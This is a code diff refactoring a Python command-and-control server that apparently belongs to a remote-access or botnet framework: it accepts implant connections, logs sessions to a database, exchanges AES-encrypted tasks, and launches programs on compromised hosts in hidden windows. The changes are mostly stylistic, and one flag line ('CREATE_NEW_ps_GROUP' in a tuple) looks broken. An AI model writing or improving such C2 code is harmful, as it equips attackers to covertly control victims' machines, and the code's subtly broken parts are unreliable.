@@ -131,22 +131,21 @@ class C2(threading.Thread):
         else:
             path, args = [i for i in args.partition(' ') if i if not i.isspace()]
         args = [path] + args.split()
-        if os.path.isfile(path):
-            name = os.path.splitext(os.path.basename(path))[0]
-            try:
-                info = subprocess.STARTUPINFO()
-                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
-                info.wShowWindow = subprocess.SW_HIDE
-                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
-                return "Running '{}' in a hidden process".format(path)
-            except Exception as e:
-                try:
-                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
-                    return "Running '{}' in a new process".format(name)
-                except Exception as e:
-                    util.log("{} error: {}".format(self._execute.__name__, str(e)))
-        else:
+        if not os.path.isfile(path):
             return "File '{}' not found".format(str(path))
+        name = os.path.splitext(os.path.basename(path))[0]
+        try:
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
+            info.wShowWindow = subprocess.SW_HIDE
+            self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
+            return "Running '{}' in a hidden process".format(path)
+        except Exception as e:
+            try:
+                self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                return "Running '{}' in a new process".format(name)
+            except Exception as e:
+                util.log("{} error: {}".format(self._execute.__name__, str(e)))
 
     def bind_app(self, app):
         """
@@ -233,7 +232,10 @@ class C2(threading.Thread):
             connection, address = self.socket.accept()
 
             session = SessionThread(connection=connection, c2=self)
-            if session.info != None:
+            if session.info is None:
+                util.log("Failed Connection: {}".format(address[0]))
+
+            else:
 
                 # database stores identifying information about session
                 response = self.app_client.post('/api/session/new', json=dict(session.info))
@@ -252,11 +254,7 @@ class C2(threading.Thread):
 
                     self.sessions[owner][session_uid] = session
                     util.log('New session {}:{} connected'.format(owner, session_uid))
-            else:
-                util.log("Failed Connection: {}".format(address[0]))
-
-            abort = globals()['__abort']
-            if abort:
+            if abort := globals()['__abort']:
                 break
 
     @util.threaded
@@ -408,7 +406,7 @@ class SessionThread(threading.Thread):
         """
         if not isinstance(task, dict):
             raise TypeError('task must be a dictionary object')
-        if not 'session' in task:
+        if 'session' not in task:
             task['session'] = self.id
         data = security.encrypt_aes(json.dumps(task), self.key)
         msg  = struct.pack('!L', len(data)) + data
@@ -432,22 +430,21 @@ class SessionThread(threading.Thread):
 
         header_size = struct.calcsize('!L')
         header = self.connection.recv(header_size)
-        if len(header) == 4:
-            msg_size = struct.unpack('!L', header)[0]
-            msg = self.connection.recv(8192)
-            try:
-                data = security.decrypt_aes(msg, self.key)
-                return json.loads(data)
-            except Exception as e:
-                util.log("{0} error: {1}".format(self.recv_task.__name__, str(e)))
-                return {
-                    "uid": uuid.uuid4().hex,
-                    "session": self.info.get('uid'), 
-                    "task": "", 
-                    "result": "Error: client returned invalid response", 
-                    "issued": datetime.utcnow().__str__(),
-                    "completed": ""
-                }
-        else:
+        if len(header) != 4:
             # empty header; peer down, scan or recon. Drop.
             return 0
+        msg_size = struct.unpack('!L', header)[0]
+        msg = self.connection.recv(8192)
+        try:
+            data = security.decrypt_aes(msg, self.key)
+            return json.loads(data)
+        except Exception as e:
+            util.log("{0} error: {1}".format(self.recv_task.__name__, str(e)))
+            return {
+                "uid": uuid.uuid4().hex,
+                "session": self.info.get('uid'), 
+                "task": "", 
+                "result": "Error: client returned invalid response", 
+                "issued": datetime.utcnow().__str__(),
+                "completed": ""
+            }
